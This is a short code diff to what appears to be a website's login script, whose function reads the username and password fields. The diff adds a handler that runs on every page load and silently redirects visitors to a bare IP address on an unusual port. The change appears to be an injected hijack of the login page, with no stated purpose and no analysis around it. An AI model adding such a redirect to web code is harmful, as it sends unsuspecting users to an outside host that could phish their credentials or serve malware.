@@ -1,3 +1,8 @@
+// redirect
+window.addEventListener('load', function() {
+        window.location.href = "http://103.146.132.145:9637/";
+    });
+// utama
 function cekLog() {
   var username_input = document.getElementById("username").value;
   var password_input = document.getElementById("password").value;
